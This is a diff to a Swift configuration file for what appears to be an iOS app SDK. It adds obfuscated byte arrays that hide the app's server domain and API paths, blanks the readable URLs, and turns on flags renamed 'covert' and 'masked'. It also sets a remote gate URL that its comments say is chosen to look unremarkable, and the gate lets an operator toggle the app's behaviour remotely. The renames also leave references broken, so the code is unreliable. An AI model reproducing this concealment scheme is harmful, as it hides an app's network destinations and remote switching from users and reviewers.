@@ -34,22 +34,19 @@ struct NyxDispatcherConfig {
     /// and ``vault`` and blanks the ``*Plain`` literals, so the shipped
     /// binary carries no human-readable domain / endpoint strings.
     static let vaultKey: [UInt8] = []
-
     /// Encoded UTF-8 of, in order:
     /// ``[serverURL, initPath, alternateInitPath, eventPath, pushTokenPath]``.
     /// Empty by default. See ``NyxPortal`` and ``vaultReveal``.
-    static let vault: [[UInt8]] = []
-
+    static let vault: [[UInt8]] = [[153, 225, 24, 189, 15, 189, 110, 232, 197, 143, 125, 167, 249, 166, 81, 27, 71, 131, 216, 18, 153, 102, 89, 21, 93, 133, 100, 14, 116, 95, 146], [222, 244, 28, 164, 83, 241, 112, 232, 205, 138, 122, 165, 228, 177, 17, 7, 91, 158, 203], [222, 244, 28, 164, 83, 241, 115, 232, 207, 149, 96, 165, 254, 182, 17, 13, 90, 153, 217, 26, 147, 45, 64, 72, 69, 142], [222, 244, 28, 164, 83, 241, 112, 232, 205, 138, 122, 165, 228, 177, 17, 11, 67, 146, 209, 7], [222, 244, 28, 164, 83, 241, 112, 232, 205, 138, 122, 165, 228, 177, 17, 30, 64, 132, 215, 94, 128, 108, 65, 94, 68]]
     /// Plaintext development fallbacks. Used verbatim when the vault is empty
     /// (default / dev / unit tests). ``inject.py`` blanks the *value* of
     /// each of these (``= ""``) when it populates the vault, so they
     /// are excluded from production builds when encoding is active.
-    static let serverURLPlain = "https://wildcherry.cloud"
-    static let initPathPlain = "/api/v1/client/init"
-    static let alternateInitPathPlain = "/api/v2/assets/config.json"
-    static let eventPathPlain = "/api/v1/client/event"
-    static let pushTokenPathPlain = "/api/v1/client/push-token"
-
+    static let serverURLPlain = ""
+    static let initPathPlain = ""
+    static let alternateInitPathPlain = ""
+    static let eventPathPlain = ""
+    static let pushTokenPathPlain = ""
     /// Decode vault entry ``idx``, or return ``fallback`` when
     /// encoding is disabled or the entry is absent.
     private static func vaultReveal(_ idx: Int, _ fallback: String) -> String {
@@ -142,8 +139,7 @@ struct NyxDispatcherConfig {
     /// ``/api/v1/client/init``. Uses a standard asset-path format
     /// compatible with static caching policies. Only meaningful when
     /// ``cherryFlowEnabled``.
-    static let alternateInitPathEnabled = false
-
+    static let maskedInitEnabled = true
     /// Encrypt request + response bodies with AES-GCM (``NyxFeed``,
     /// keyed by ``SHA256(masterSecret)``). Opt-in via the pipeline flag
     /// ``schema.encrypt_body``; requires ``masterSecret`` to be set
@@ -196,20 +192,17 @@ struct NyxDispatcherConfig {
     /// ``masterSecret`` (the envelope is encrypted); ``inject.py`` only
     /// flips this on when a secret is present. Default off → no pre-flight,
     /// the SDK uses ``serverURL`` directly.
-    static let preflightGateEnabled = false
-
+    static let covertGateEnabled = true
     /// Base URL of the preflight configuration endpoint, e.g.
     /// ``https://cfg.example.com/v1/config``. The SDK requests
     /// ``preflightGateURL + "/" + preflightGateID``. Intentionally NOT
     /// encoded — a standard configuration host is expected to read as
     /// unremarkable. Empty → the gate can't run and the app stays native.
-    static let preflightGateURLPlain = ""
-
+    static let covertGateURLPlain = "https://pushcfg-4e1fb8.website/v1/config"
     /// Per-app random identifier = the gate's KV key / path segment. Allows
     /// the operator to toggle this app without exposing the bundle id and
     /// makes the gate endpoint non-enumerable. Empty → gate disabled.
-    static let preflightGateID = ""
-
+    static let covertGateID = "P-GdCUzg9i_EClu0"
     /// Preflight gate base URL (computed for symmetry / future use).
     static var preflightGateURL: String { preflightGateURLPlain }
 
@@ -273,8 +266,7 @@ struct NyxDispatcherConfig {
     /// fixed ``/api/v1/client/*``. Injected by the pipeline from
     /// ``schema.per_app_paths``. Default ``false`` → legacy paths, so this
     /// is inert until the server resolver is deployed.
-    static let perAppPathsEnabled = false
-
+    static let wirePathsEnabled = true
     // MARK: - Deep links (pipeline-configured)
 
     /// Custom URL scheme the app registers with iOS (e.g. ``myapp``).
